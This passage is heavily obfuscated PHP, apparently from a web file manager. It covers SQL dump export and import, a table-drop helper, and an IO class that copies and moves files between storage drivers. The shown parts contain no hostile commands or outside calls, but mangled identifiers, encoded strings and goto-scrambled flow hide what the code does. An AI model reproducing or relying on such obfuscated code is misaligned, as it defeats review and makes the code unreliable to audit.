$B›Ç’ä”ÖÉ->getPk(); $eŞĞÉ÷éè = $B›Ç’ä”ÖÉ->getDbFields(); do { $c´‰Í˜Ë = array($F¬¾‘Š¸ØÜ => array($_SERVER[›èö’ù¤][997], $Eò³‘§Ç)); $Bˆ‹ºÒâÇ› = $B›Ç’ä”ÖÉ->where($c´‰Í˜Ë)->field($eŞĞÉ÷éè)->order($F¬¾‘Š¸ØÜ . $_SERVER[›èö’ù¤][1051])->limit($cé æ¿)->select(); $Bˆ‹ºÒâÇ› = !empty($Bˆ‹ºÒâÇ›) ? $Bˆ‹ºÒâÇ› : array(); if (!($fŠñÁ¿‘±‘ = count($Bˆ‹ºÒâÇ›))) { break; } $c‚ê™ˆÉ¿Œ = end($Bˆ‹ºÒâÇ›); $Eò³‘§Ç = $c‚ê™ˆÉ¿Œ[$F¬¾‘Š¸ØÜ]; $AìÀœæøêÇ = array(); foreach ($Bˆ‹ºÒâÇ› as $EèãÃÉ½É) { if ($A†ËÄ¼®¬ == $_SERVER[›èö’ù¤][1052] && $EèãÃÉ½É[$_SERVER[›èö’ù¤][29]] == $_SERVER[›èö’ù¤][1053]) { $Fˆ‹âæá˜ = json_decode($EèãÃÉ½É[$_SERVER[›èö’ù¤][372]], !0); if ($Fˆ‹âæá˜[$_SERVER[›èö’ù¤][28]] == date($_SERVER[›èö’ù¤][735]) && !$Fˆ‹âæá˜[$_SERVER[›èö’ù¤][734]]) { continue; } } if ($fòá¥¹±ë) { $EèãÃÉ½É[$_SERVER[›èö’ù¤][76]] = "\x7b\151\x6f\x3a{$fòá¥¹±ë}\175" . substr($EèãÃÉ½É[$_SERVER[›èö’ù¤][76]], strlen("\173\x69\157\x3a{$EèãÃÉ½É[$_SERVER[›èö’ù¤][808]]}\x7d")); $EèãÃÉ½É[$_SERVER[›èö’ù¤][808]] = $fòá¥¹±ë; } $AìÀœæøêÇ[] = $_SERVER[›èö’ù¤][1054] . $this->sqlEncode($EèãÃÉ½É) . $_SERVER[›èö’ù¤][1055]; } $cŞá‰õàçØ = "\x49\116\123\105\122\124\40\x49\x4e\124\x4f\40\x60{$A†ËÄ¼®¬}\x60\x20\50\x60" . implode($_SERVER[›èö’ù¤][1056], $eŞĞÉ÷éè) . $_SERVER[›èö’ù¤][1057]; fwrite($AçäÏ¹âë, $cŞá‰õàçØ . implode($_SERVER[›èö’ù¤][1058], $AìÀœæøêÇ) . $_SERVER[›èö’ù¤][68] . PHP_EOL); $aã¨Ä¯‡Ù += $fŠñÁ¿‘±‘; if ($d­Î¼ÑÕº‚) { $d­Î¼ÑÕº‚->update($fŠñÁ¿‘±‘); } } while ($cé æ¿ == $fŠñÁ¿‘±‘); goto añË×‚ã…ç; CÌÌ´‹…¡è: } public function sqlToDb($böºÆÁÃ‡â, $eÁ êÆÖŞ = null) { goto Dİá‘ ¯èì; Dİá‘ ¯èì: $b˜±Ñâ“ =& $_SERVER[›èö’ù¤]; $dá¶¯ˆöÍÍ = $this->model()->db(); $eŠ³¸¹î–˜ = @fopen($böºÆÁÃ‡â, $b˜±Ñâ“[1059]); goto bÁæ¥î¸Œö; dæ›™É¾¼¦: $A—‹¦îõğ = 0; $E†ÊŠË‚ã = 4194304 - 104858; $CÀ©ª‘˜¼‡ = 1000000 - 104858; goto CìÕ‘ßÒãˆ; b÷·¯ìó: $FÇ¶®Ô»‰Œ = array(); $a²¼Œ¤Š‚Œ = $this->type == $b˜±Ñâ“[9] ? 500 : 2000; $EÍÌìÄ»˜ = basename($böºÆÁÃ‡â, $b˜±Ñâ“[770]); goto dæ›™É¾¼¦; CìÕ‘ßÒãˆ: while (!feof($eŠ³¸¹î–˜)) { $bŸ³Ì¡…š‹ = trim(fgets($eŠ³¸¹î–˜)); if (!$bŸ³Ì¡…š‹) { continue; } $DÉ¥¤Œ’ƒ = $this->sqlDecode($bŸ³Ì¡…š‹, $this->type); if (stripos($DÉ¥¤Œ’ƒ, $b˜±Ñâ“[353]) === 0) { if (!$f™ÑÜÉ†‰¬) { $f™ÑÜÉ†‰¬ = $DÉ¥¤Œ’ƒ . $b˜±Ñâ“[50]; } continue; } if ($eÁ êÆÖŞ) { $eÁ êÆÖŞ->task[$b˜±Ñâ“[1046]] += 1; } $CÇ¬¡œ‘ñ½++; $FÇ¶®Ô»‰Œ[] = rtrim(rtrim(trim($DÉ¥¤Œ’ƒ), $b˜±Ñâ“[47]), $b˜±Ñâ“[68]); $c–Ö’İ‡˜„ = null; $D„Á¶½ŞàÑ = strlen($DÉ¥¤Œ’ƒ); $A—‹¦îõğ += $D„Á¶½ŞàÑ; if ($A—‹¦îõğ >= ($a²¼Œ¤Š‚Œ == 500 ? $E†ÊŠË‚ã : $CÀ©ª‘˜¼‡)) { $c–Ö’İ‡˜„ = array_pop($FÇ¶®Ô»‰Œ); if ($CÇ¬¡œ‘ñ½ > 1) { $CÇ¬¡œ‘ñ½--; } } if ($CÇ¬¡œ‘ñ½ >= $a²¼Œ¤Š‚Œ || $c–Ö’İ‡˜„) { goto f¥Ò„É‹ëê; bÀãê‡èÌ: if ($c–Ö’İ‡˜„) { $FÇ¶®Ô»‰Œ = array($c–Ö’İ‡˜„); $CÇ¬¡œ‘ñ½ = 1; $A—‹¦îõğ = $D„Á¶½ŞàÑ; } goto bÌÄ×¸§ß; f¥Ò„É‹ëê: $DÉ¥¤Œ’ƒ = $f™ÑÜÉ†‰¬ . implode($b˜±Ñâ“[47], $FÇ¶®Ô»‰Œ); if (!$dá¶¯ˆöÍÍ->execute($DÉ¥¤Œ’ƒ)) { return !1; } if ($eÁ êÆÖŞ) { $eÁ êÆÖŞ->update($CÇ¬¡œ‘ñ½); } goto eÑîßÚŠ‹; eÑîßÚŠ‹: $FÇ¶®Ô»‰Œ = array(); $CÇ¬¡œ‘ñ½ = 0; $A—‹¦îõğ = 0; goto bÀãê‡èÌ; bÌÄ×¸§ß: } } fclose($eŠ³¸¹î–˜); if (!empty($FÇ¶®Ô»‰Œ)) { $DÉ¥¤Œ’ƒ = $f™ÑÜÉ†‰¬ . implode($b˜±Ñâ“[47], $FÇ¶®Ô»‰Œ); if (!$dá¶¯ˆöÍÍ->execute($DÉ¥¤Œ’ƒ)) { return !1; } if ($eÁ êÆÖŞ) { $eÁ êÆÖŞ->update($CÇ¬¡œ‘ñ½); } } goto eÂ¾Â«µñ; bÁæ¥î¸Œö: if (!$eŠ³¸¹î–˜) { return !1; } $CÇ¬¡œ‘ñ½ = 0; $f™ÑÜÉ†‰¬ = $b˜±Ñâ“[33]; goto b÷·¯ìó; eÂ¾Â«µñ: return !0; goto AÖƒº×ŒÍÇ; AÖƒº×ŒÍÇ: } public function dropTable($B”ä‰Ë„øí = null) { $c‹¼Š®¡¥ = $this->model()->db(); $aïµŸÈ”¥ = $B”ä‰Ë„øí ? array($B”ä‰Ë„øí) : $c‹¼Š®¡¥->getTables(); if (!$aïµŸÈ”¥) { return; } foreach ($aïµŸÈ”¥ as $B”ä‰Ë„øí) { if ($B”ä‰Ë„øí) { $B”ä‰Ë„øí = strtolower($B”ä‰Ë„øí); } else { continue; } $c‹¼Š®¡¥->execute("\x64\162\x6f\160\40\164\141\142\154\x65\40\151\146\40\145\170\x69\x73\164\163\40\140{$B”ä‰Ë„øí}\x60"); } } private function taskToCache($eÄ¥š†˜Êğ = null) { $EòÒø´Èå =& $_SERVER[›èö’ù¤]; if (!$eÄ¥š†˜Êğ) { return; } $D÷¹ƒ·‡¼ = array($EòÒø´Èå[1048] => $eÄ¥š†˜Êğ->task[$EòÒø´Èå[1048]], $EòÒø´Èå[1046] => $eÄ¥š†˜Êğ->task[$EòÒø´Èå[1046]], $EòÒø´Èå[1060] => $eÄ¥š†˜Êğ->task[$EòÒø´Èå[1060]]); if ($D÷¹ƒ·‡¼[$EòÒø´Èå[1046]] == $D÷¹ƒ·‡¼[$EòÒø´Èå[1060]]) { $D÷¹ƒ·‡¼[$EòÒø´Èå[744]] = 1; } Cache::set($EòÒø´Èå[1061] . $eÄ¥š†˜Êğ->task[$EòÒø´Èå[395]], $D÷¹ƒ·‡¼); $eÄ¥š†˜Êğ->end(); } private function sqlEncode($B¤ã¸ÍòºÒ) { $c§ØÎÌ™¥á =& $_SERVER[›èö’ù¤]; $FÈŒÇÒ›È‰ = array(); foreach ($B¤ã¸ÍòºÒ as $AĞíŸ©ƒ¡’) { if (is_array($AĞíŸ©ƒ¡’)) { $AĞíŸ©ƒ¡’ = json_encode_force($AĞíŸ©ƒ¡’); } $AĞíŸ©ƒ¡’ = addslashes($AĞíŸ©ƒ¡’); $AĞíŸ©ƒ¡’ = str_replace(array($c§ØÎÌ™¥á[1062], $c§ØÎÌ™¥á[229]), array($c§ØÎÌ™¥á[1063], $c§ØÎÌ™¥á[1064]), $AĞíŸ©ƒ¡’); $FÈŒÇÒ›È‰[] = str_replace($c§ØÎÌ™¥á[55], $c§ØÎÌ™¥á[1065], $AĞíŸ©ƒ¡’); } return $c§ØÎÌ™¥á[55] . implode($c§ØÎÌ™¥á[1066], $FÈŒÇÒ›È‰) . $c§ØÎÌ™¥á[55]; } private function sqlDecode($d…ƒ½¯¼öâ, $AÕ°‚øÎ‰) { $bæäíŸğ’œ =& $_SERVER[›èö’ù¤]; $d…ƒ½¯¼öâ = str_replace(array($bæäíŸğ’œ[1063], $bæäíŸğ’œ[1064]), array($bæäíŸğ’œ[1062], $bæäíŸğ’œ[229]), $d…ƒ½¯¼öâ); if ($AÕ°‚øÎ‰ == $bæäíŸğ’œ[9]) { $d…ƒ½¯¼öâ = stripslashes($d…ƒ½¯¼öâ); } return $d…ƒ½¯¼öâ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($D°Úß‡ªÊÆ, $c‰®óÀŸ) { goto E¬˜ƒÆ–À¶; E¬˜ƒÆ–À¶: $cĞŠ‹ÄÔÈ =& $_SERVER[›èö’ù¤]; $f‡Ïá—àåï = $c‰®óÀŸ; $GLOBALS[$cĞŠ‹ÄÔÈ[1067]] = $cĞŠ‹ÄÔÈ[1068] . $D°Úß‡ªÊÆ; goto cÏ÷ÜŒ‰š…; cÏ÷ÜŒ‰š…: Hook::trigger($cĞŠ‹ÄÔÈ[1068] . $D°Úß‡ªÊÆ . $cĞŠ‹ÄÔÈ[1069], $f‡Ïá—àåï); $b¾ˆô—¼ÒÂ = self::driverMake($c‰®óÀŸ[0]); if (method_exists($b¾ˆô—¼ÒÂ, $D°Úß‡ªÊÆ)) { $e‡©¾¦Ïß = @call_user_func_array(array($b¾ˆô—¼ÒÂ, $D°Úß‡ªÊÆ), $c‰®óÀŸ); } else { if (method_exists($b¾ˆô—¼ÒÂ, $cĞŠ‹ÄÔÈ[1070])) { $e‡©¾¦Ïß = @call_user_func_array(array($b¾ˆô—¼ÒÂ, $D°Úß‡ªÊÆ), $c‰®óÀŸ); } else { if (method_exists(self, $D°Úß‡ªÊÆ)) { $e‡©¾¦Ïß = @call_user_func_array(array(self, $D°Úß‡ªÊÆ), $c‰®óÀŸ); } else { $e‡©¾¦Ïß = call_user_func_array(array(parent, $D°Úß‡ªÊÆ), $c‰®óÀŸ); } } } goto FË’Ò§ ™; FË’Ò§ ™: Hook::trigger($cĞŠ‹ÄÔÈ[1068] . $D°Úß‡ªÊÆ . $cĞŠ‹ÄÔÈ[1071], $f‡Ïá—àåï, $e‡©¾¦Ïß); return $e‡©¾¦Ïß; goto eæ¯ğ”¸Ëø; eæ¯ğ”¸Ëø: } public static function init($ağÌÉ©ŠÃ³) { return self::driverMake($ağÌÉ©ŠÃ³); } public static function copy($Bï•‚õ‘«Î, $Eˆ†‚»İÏ, $A÷ôæÓ¨ñç = false, $Eƒè“Â„ƒ = false) { return self::copyMoveStart($Bï•‚õ‘«Î, $Eˆ†‚»İÏ, $A÷ôæÓ¨ñç, $_SERVER[›èö’ù¤][544], $Eƒè“Â„ƒ); } public static function move($d”’‰Ğ™¤å, $e’†±ã²¯ß, $dâ­¬²¾éÆ = false, $EŒ—¯¤äº = false) { return self::copyMoveStart($d”’‰Ğ™¤å, $e’†±ã²¯ß, $dâ­¬²¾éÆ, $_SERVER[›èö’ù¤][546], $EŒ—¯¤äº); } private static function copyMoveStart($b«×°ÆÖºÚ, $aï½­ê½ñ¥, $E°àÁÛÛ, $e¬¶èç¶î†, $A‡ÙèŸ‰ƒ) { $b»¡Ÿ½» =& $_SERVER[›èö’ù¤]; $c°²È·Îß‚ = array($b«×°ÆÖºÚ, $aï½­ê½ñ¥, $E°àÁÛÛ, $A‡ÙèŸ‰ƒ); Hook::trigger($b»¡Ÿ½»[1068] . $e¬¶èç¶î† . $b»¡Ÿ½»[1069], $c°²È·Îß‚); $bª™µ¥ëòê = self::copyMove($b«×°ÆÖºÚ, $aï½­ê½ñ¥, $E°àÁÛÛ, $e¬¶èç¶î†, $A‡ÙèŸ‰ƒ); Hook::trigger($b»¡Ÿ½»[1068] . $e¬¶èç¶î† . $b»¡Ÿ½»[1071], $c°²È·Îß‚, $bª™µ¥ëòê); return $bª™µ¥ëòê; } public static function saveFile($féé­÷Œˆ, $Bè×ß×Ñùñ, $Eò°Ğ’Ú¬ = true) { goto c×Óİœ®“æ; d»÷½‚¹ß§: if ($CÃçË¼¨³ƒ->pathParse[$b­°ÄÓÍÙ¥[1072]]) { $CÃçË¼¨³ƒ = self::driverMake($CÃçË¼¨³ƒ->pathParse[$b­°ÄÓÍÙ¥[1072]]); } $C‘æ…²Ú­ = $aÉôŒœæ²ğ->pathFather($Bè×ß×Ñùñ); $Aª‰—·ô ¤ = !0; goto FÑŠèŸ¤ÒŞ; c×Óİœ®“æ: $b­°ÄÓÍÙ¥ =& $_SERVER[›èö’ù¤]; $bñª®Åø‡ˆ = self::info($Bè×ß×Ñùñ); $CÃçË¼¨³ƒ = self::driverMake($féé­÷Œˆ); goto D¢÷ÔæÒ¥³; FÑŠèŸ¤ÒŞ: if (!$Eò°Ğ’Ú¬ && self::driverIsSame($CÃçË¼¨³ƒ, $aÉôŒœæ²ğ)) { $Aª‰—·ô ¤ = !1; } $FªãÅ ÷¦¬ = self::copyFile($CÃçË¼¨³ƒ, $féé­÷Œˆ, $aÉôŒœæ²ğ, $C‘æ…²Ú­, $bñª®Åø‡ˆ[$b­°ÄÓÍÙ¥[28]], $Aª‰—·ô ¤); if ($b½ÒÚâİÎ”) { $FªãÅ ÷¦¬ = $b½ÒÚâİÎ”->getPathOuter($FªãÅ ÷¦¬); } goto fêÅŸ°²İ; fêÅŸ°²İ: return $FªãÅ ÷¦¬; goto B¢›ßÕÕƒÀ; D¢÷ÔæÒ¥³: $aÉôŒœæ²ğ = self::driverMake($Bè×ß×Ñùñ); $b½ÒÚâİÎ” = !1; if ($aÉôŒœæ²ğ->pathParse[$b­°ÄÓÍÙ¥[1072]]) { $b½ÒÚâİÎ” = $aÉôŒœæ²ğ; $aÉôŒœæ²ğ = self::driverMake($aÉôŒœæ²ğ->pathParse[$b­°ÄÓÍÙ¥[1072]]); } goto d»÷½‚¹ß§; B¢›ßÕÕƒÀ: } private static function copyMove($B””¶©îõ, $dŒõÁººíå, $AÏ×¼ãôÛ, $dï¼£òÃŞ², $c ø¥í¹¦Ê = false) { goto Dğ›„î¬ßÓ; CÑœó–ÇÕ: $BÌëÅóÜ¨  = !1; if ($d…Ã‘Ó½->pathParse[$bİŸ¬¯„İÆ[1072]]) { $BÌëÅóÜ¨  = $d…Ã‘Ó½; $d…Ã‘Ó½ = self::driverMake($d…Ã‘Ó½->pathParse[$bİŸ¬¯„İÆ[1072]]); } if ($Díê„¨†à–->pathParse[$bİŸ¬¯„İÆ[1072]]) { $Díê„¨†à– = self::driverMake($Díê„¨†à–->pathParse[$bİŸ¬¯„İÆ[1072]]); } goto DÖ‚Õóğ©·; aØİ‚‹¿½¦: $Díê„¨†à– = self::driverMake($B””¶©îõ); $d…Ã‘Ó½ = self::driverMake($dŒõÁººíå); $d«òÕİ…Üø = $dï¼£òÃŞ² == $bİŸ¬¯„İÆ[546]; goto CÑœó–ÇÕ; d—‚‰Ø‡¦¢: if ($F‰È×ß¸º && $d«òÕİ…Üø) { $Díê„¨†à–->remove($B””¶©îõ); } if ($BÌëÅóÜ¨ ) { $F‰È×ß¸º = $BÌëÅóÜ¨ ->getPathOuter($F‰È×ß¸º); } return $F‰È×ß¸º; goto A¦Ø²„£à; DÖ‚Õóğ©·: self::check($Díê„¨†à–, $B””¶©îõ, $d…Ã‘Ó½, $dŒõÁººíå); Hook::trigger($bİŸ¬¯„İÆ[73], $Díê„¨†à–, $B””¶©îõ, $d…Ã‘Ó½, $dŒõÁººíå); $d‰õ–÷ù  = self::driverIsSame($Díê„¨†à–, $d…Ã‘Ó½); goto eºïÍñ‚Ò¥; eºïÍñ‚Ò¥: if ($d‰õ–÷ù ) { if ($dï¼£òÃŞ² == $bİŸ¬¯„İÆ[546] && !method_exists($d…Ã‘Ó½, $bİŸ¬¯„İÆ[1073]) && trim($dŒõÁººíå, $bİŸ¬¯„İÆ[8]) == trim($d…Ã‘Ó½->pathFather($B””¶©îõ), $bİŸ¬¯„İÆ[8])) { if ($Díê„¨†à–->pathThis($B””¶©îõ) != $c ø¥í¹¦Ê && !$Díê„¨†à–->isTypeObject()) { return $Díê„¨†à–->rename($B””¶©îõ, $c ø¥í¹¦Ê); } return $d…Ã‘Ó½->getPathOuter($B””¶©îõ); } if (method_exists($d…Ã‘Ó½, $dï¼£òÃŞ²)) { return $d…Ã‘Ó½->{$dï¼£òÃŞ²}($B””¶©îõ, $dŒõÁººíå, $AÏ×¼ãôÛ); } } $c»««ÄéÇó = $Díê„¨†à–->isFile($B””¶©îõ); if (!$c»««ÄéÇó && $d…Ã‘Ó½->getType() == $bİŸ¬¯„İÆ[742] && $Díê„¨†à–->getType() == $bİŸ¬¯„İÆ[106]) { $F‰È×ß¸º = $d…Ã‘Ó½->copyFolderFromIO($Díê„¨†à–, $B””¶©îõ, $dŒõÁººíå, $AÏ×¼ãôÛ, $d«òÕİ…Üø, $c ø¥í¹¦Ê); } else { $F‰È×ß¸º = self::copyPath($Díê„¨†à–, $B””¶©îõ, $d…Ã‘Ó½, $dŒõÁººíå, $AÏ×¼ãôÛ, $d«òÕİ…Üø, $c»««ÄéÇó, $c ø¥í¹¦Ê); } goto d—‚‰Ø‡¦¢; Dğ›„î¬ßÓ: $bİŸ¬¯„İÆ =& $_SERVER[›èö’ù¤]; if (!$B””¶©îõ || $B””¶©îõ == $bİŸ¬¯„İÆ[8] || !$dŒõÁººíå) { return !1; } ignore_timeout(); goto aØİ‚‹¿½¦; A¦Ø²„£à: } private static function check($BÅ·æ­ò†Ø, $a³æ¤Ãöñ, $F¡†„Ñß«, &$a£ï¼ïå•ä) { $f‡Â² ÔïÏ =& $_SERVER[›èö’ù¤]; if (self::driverIsSame($BÅ·æ­ò†Ø, $F¡†„Ñß«) && $BÅ·æ­ò†Ø->isFolder($a³æ¤Ãöñ) && $BÅ·æ­ò†Ø->isParentOf($a³æ¤Ãöñ, $a£ï¼ïå•ä)) { show_json(LNG($f‡Â² ÔïÏ[1074]), !1); } if (!$BÅ·æ­ò†Ø->exist($a³æ¤Ãöñ)) { show_json(LNG($f‡Â² ÔïÏ[105]), !1); } } private static function copyPath($Eç®ƒÈñù“, $cƒ°İâßê, $AŸÉ¢îÎ‘³, $b¿°ùÔíÔ², $FÌ×ÌôÙª”, $bù¹¶Ø”ê, $cˆ»©ÙÊ²†, $dìÃœŸ·Âç = false) { goto B‘ê¼¨¥Àª; CÁé¬¥Şï¯: if ($cˆ»©ÙÊ²†) { return self::copyFile($Eç®ƒÈñù“, $cƒ°İâßê, $AŸÉ¢îÎ‘³, $b¿°ùÔíÔ², $bæ˜Ôº½¢Ú, $bù¹¶Ø”ê); } if ($FÌ×ÌôÙª” == REPEAT_RENAME_FOLDER) { $FÌ×ÌôÙª” = !1; } $dá‚¶óÙ„ = rtrim($b¿°ùÔíÔ², $f—•Â²±’[8]) . $f—•Â²±’[8] . $bæ˜Ôº½¢Ú; goto DˆØÔº½­; f¾ù‹Àº‰£: $F¤º„‰ÉÒ = is_array($F¤º„‰ÉÒ) ? $F¤º„‰ÉÒ : array($f—•Â²±’[74] => array(), $f—•Â²±’[75] => array()); $B¡“„œ‡Û† = array_merge($F¤º„‰ÉÒ[$f—•Â²±’[74]], $F¤º„‰ÉÒ[$f—•Â²±’[75]]); foreach ($B¡“„œ‡Û† as $aìÂÓ‘ä•) { $aÍâ…Á­“³ = $aìÂÓ‘ä•[$f—•Â²±’[29]] == $f—•Â²±’[193]; $cƒ°İâßê = $Eç®ƒÈñù“->getPathInner($aìÂÓ‘ä•[$f—•Â²±’[76]]); $F²Æˆà¾º = self::copyPath($Eç®ƒÈñù“, $cƒ°İâßê, $AŸÉ¢îÎ‘³, $b¿°ùÔíÔ², $FÌ×ÌôÙª”, $bù¹¶Ø”ê, $aÍâ…Á­“³); if (!$F²Æˆà¾º) { IO::errorTips($f—•Â²±’[1075] . $cƒ°İâßê . $f—•Â²±’[67] . $b¿°ùÔíÔ²); } } goto dâÒ±‹ˆ¬„; dâÒ±‹ˆ¬„: self::copyMoveKeepInfo($Eç®ƒÈñù“, $cƒ°İâßê, $e‰‘íœ„†); return $e‰‘íœ„†; goto fˆŞ¦­à‚®; DˆØÔº½­: $e‰‘íœ„† = $AŸÉ¢îÎ‘³->mkdir($AŸÉ¢îÎ‘³->getPath($dá‚¶óÙ„)); $b¿°ùÔíÔ² = $AŸÉ¢îÎ‘³->getPathInner($e‰‘íœ„†); $F¤º„‰ÉÒ = $Eç®ƒÈñù“->listPath($cƒ°İâßê, !0); goto f¾ù‹Àº‰£; B‘ê¼¨¥Àª: $f—•Â²±’ =& $_SERVER[›èö’ù¤]; $bæ˜Ôº½¢Ú = empty($dìÃœŸ·Âç) && $dìÃœŸ·Âç !== $f—•Â²±’[191] ? $Eç®ƒÈñù“->pathThis($cƒ°İâßê) : $dìÃœŸ·Âç; if ($FÌ×ÌôÙª”) { $aá‚˜… ½ = $AŸÉ¢îÎ‘³->fileNameExist($b¿°ùÔíÔ², $bæ˜Ôº½¢Ú); $bæ˜Ôº½¢Ú = $AŸÉ¢îÎ‘³->fileNameAuto($b¿°ùÔíÔ², $bæ˜Ôº½¢Ú, $FÌ×ÌôÙª”, !$cˆ»©ÙÊ²†); $FÌ×ÌôÙª” = $aá‚˜… ½ ? $FÌ×ÌôÙª” : !1; } goto CÁé¬¥Şï¯; fˆŞ¦­à‚®: } private static function copyFile($CÇƒ’¤ËíŠ, $fÏËµ¿ĞÖÁ, $Bå†ØïßÎÈ, $c†ê‰©‘¶Ì, $aß›ÓŞî²ª, $b•Ã†Æ‡È) { goto FÈæ™öÎÅØ; B‰İã¥Ô°œ: self::remove($dÈ¡›ç•Ğ); Hook::trigger($c‡è¾ÚêÉ[1078], $CÇƒ’¤ËíŠ, $fÏËµ¿ĞÖÁ, $Bå†ØïßÎÈ, $c†ê‰©‘¶Ì, $aß›ÓŞî²ª, $Fà‰ù††½); self::copyMoveKeepInfo($CÇƒ’¤ËíŠ, $fÏËµ¿ĞÖÁ, $Fà‰ù††½); goto F¥ó“‡ñ¦; BâŒ‘Õ•Î: mk_dir($bé¥–ôåÀ); $Cï¡İª„Ó¼ = $bé¥–ôåÀ . $bºŠ‹Ï»Ğİ; $dÈ¡›ç•Ğ = $Cï¡İª„Ó¼; goto c²ê‹ ¨¢Ñ; F¥ó“‡ñ¦: return $Fà‰ù††½; goto B¾×”ÚØÜò; FÈæ™öÎÅØ: $c‡è¾ÚêÉ =& $_SERVER[›èö’ù¤]; $c†ê‰©‘¶Ì = $Bå†ØïßÎÈ->getPath(rtrim($c†ê‰©‘¶Ì, $c‡è¾ÚêÉ[8]) . $c‡è¾ÚêÉ[8] . $aß›ÓŞî²ª); $bºŠ‹Ï»Ğİ = $c‡è¾ÚêÉ[1076] . time() . rand_string(5); goto Eç›Ÿòæä; Eç›Ÿòæä: Hook::trigger($c‡è¾ÚêÉ[1077], $CÇƒ’¤ËíŠ, $fÏËµ¿ĞÖÁ, $Bå†ØïßÎÈ, $c†ê‰©‘¶Ì, $aß›ÓŞî²ª, $bºŠ‹Ï»Ğİ); if (self::driverIsSame($CÇƒ’¤ËíŠ, $Bå†ØïßÎÈ)) { if ($b•Ã†Æ‡È) { $Fà‰ù††½ = $Bå†ØïßÎÈ->moveFile($fÏËµ¿ĞÖÁ, $c†ê‰©‘¶Ì); } else { $Fà‰ù††½ = $Bå†ØïßÎÈ->copyFile($fÏËµ¿ĞÖÁ, $c†ê‰©‘¶Ì); } Hook::trigger($c‡è¾ÚêÉ[1078], $CÇƒ’¤ËíŠ, $fÏËµ¿ĞÖÁ, $Bå†ØïßÎÈ, $c†ê‰©‘¶Ì, $aß›ÓŞî²ª, $Fà‰ù††½); self::copyMoveKeepInfo($CÇƒ’¤ËíŠ, $fÏËµ¿ĞÖÁ, $Fà‰ù††½); return $Fà‰ù††½; } $dÔÄªˆ®İ = TEMP_FILES; goto fÍÚˆ­°Û; c²ê‹ ¨¢Ñ: $Cï¡İª„Ó¼ = $CÇƒ’¤ËíŠ->download($fÏËµ¿ĞÖÁ, $Cï¡İª„Ó¼); $Cï¡İª„Ó¼ = $CÇƒ’¤ËíŠ->iconvApp($Cï¡İª„Ó¼); $Fà‰ù††½ = $Bå†ØïßÎÈ->upload($c†ê‰©‘¶Ì, $Cï¡İª„Ó¼, $b•Ã†Æ‡È); goto B‰İã¥Ô°œ; fÍÚˆ­°Û: if ($GLOBALS[$c‡è¾ÚêÉ[6]][$c‡è¾ÚêÉ[88]][$c‡è¾ÚêÉ[786]]) { $dÔÄªˆ®İ = $GLOBALS[$c‡è¾ÚêÉ[6]][$c‡è¾ÚêÉ[88]][$c‡è¾ÚêÉ[786]]; } $b•Ã†Æ‡È = !0; $bé¥–ôåÀ = $dÔÄªˆ®İ; goto BâŒ‘Õ•Î; B¾×”ÚØÜò: } private static function copyMoveKeepInfo($d¾ã£ƒá, $cµ‘§Óôå¢, $Fàö­˜…”) { if (!$Fàö­˜…”) { return; } $e¢¬ã—§¾ = $d¾ã£ƒá->info($cµ‘§Óôå¢); if (!is_array($e¢¬ã—§¾)) { return; } IO::setModifyTime($Fàö­˜…”, $e¢¬ã—§¾[$_SERVER[›èö’ù¤][84]]); } public static function pathFather($eõ‚¢í¬†) { $e·Øé…ååô = IO::init($eõ‚¢í¬†); $aĞóÔ„—¶½ = $e·Øé…ååô->pathFather($e·Øé…ååô->path); return $e·Øé…ååô->getPathOuter($aĞóÔ„—¶½); } public static function fileOut($FÕÀª›ÌÂ†, $e½‘Ç¡££¤ = false, $D‘îÖÑÖ‹ = false, $C„²†œíœÈ = '') { $A˜†èæÎœœ = self::driverMake($FÕÀª›ÌÂ†); if ($A˜†èæÎœœ->isFileOutServer()) { return $A˜†èæÎœœ->fileOutServer($FÕÀª›ÌÂ†, $e½‘Ç¡££¤, $D‘îÖÑÖ‹, $C„²†œíœÈ); } return $A˜†èæÎœœ->fileOut($FÕÀª›ÌÂ†, $e½‘Ç¡££¤, $D‘îÖÑÖ‹, $C„²†œíœÈ); } public static function fileOutImage($eğˆ“¾ë°Ø, $fäÊ³’ã = 250) { $Fõùˆ­ÚÂ® = array(250, 600, 1200, 2000, 3000, 5000); for ($aéÍ©Á²¹­ = 0; $aéÍ©Á²¹­ < count($Fõùˆ­ÚÂ®); $aéÍ©Á²¹­++) { if ($aéÍ©Á²¹­ == 0 && $fäÊ³’ã <= $Fõùˆ­ÚÂ®[$aéÍ©Á²¹­]) { $fäÊ³’ã = $Fõùˆ­ÚÂ®[$aéÍ©Á²¹­]; break; } else { if ($fäÊ³’ã > $Fõùˆ­ÚÂ®[$aéÍ©Á²¹­ - 1] && $fäÊ³’ã <= $Fõùˆ­ÚÂ®[$aéÍ©Á²¹­]) { $fäÊ³’ã = $Fõùˆ­ÚÂ®[$aéÍ©Á²¹­]; break; } else { if ($aéÍ©Á²¹­ == count($Fõùˆ­ÚÂ®) - 1 && $fäÊ³’ã > $Fõùˆ­ÚÂ®[$aéÍ©Á²¹­]) { $fäÊ³’ã = $Fõùˆ­ÚÂ®[$aéÍ©Á²¹­]; break; } } } } $A¸¥Í“ÄÆÓ = self::driverMake($eğˆ“¾ë°Ø); if ($A¸¥Í“ÄÆÓ->isFileOutServer()) { return $A¸¥Í“ÄÆÓ->fileOutImageServer($eğˆ“¾ë°Ø, $fäÊ³’ã); } return $A¸¥Í“ÄÆÓ->fileOutImage($eğˆ“¾ë°Ø, $fäÊ³’ã); } private static function driverIsSame($FÀåëÂÑ, $FÆÆÊÕ‡Ü§) { goto D–ˆÆŒõÇ“; F²†ï÷Â¹: if ($FÀåëÂÑ->pathDriver == $FÆÆÊÕ‡Ü§->pathDriver) { return !0; } return !1; goto FßæÓ—›°Û; a†Œªğ¬ÅÛ: if ($E„×¸¤¯Ï != $B”¿ŞÉ¹’ƒ) { return !1; } if ($E„×¸¤¯Ï == $BõšÁ®¯[742]) { return !0; } if ($E„×¸¤¯Ï == $BõšÁ®¯[106]) { return !0; } goto F²†ï÷Â¹; D–ˆÆŒõÇ“: $BõšÁ®¯ =& $_SERVER[›èö’ù¤]; $E„×¸¤¯Ï = $FÀåëÂÑ->getType(); $B”¿ŞÉ¹’ƒ = $FÆÆÊÕ‡Ü§->getType(); goto a†Œªğ¬ÅÛ; FßæÓ—›°Û: } public static function copyUpdate($B„™ñ¨ğç“, $bˆå”Îéœà) { goto FäÔ°µß¸÷; cÒõï¨™§À: Hook::trigger($D‡™‹ ˜ö§[1082], $B„™ñ¨ğç“, $bˆå”Îéœà, $aßé´Ãâ“±); foreach ($eÊä¸†Ğ÷’ as 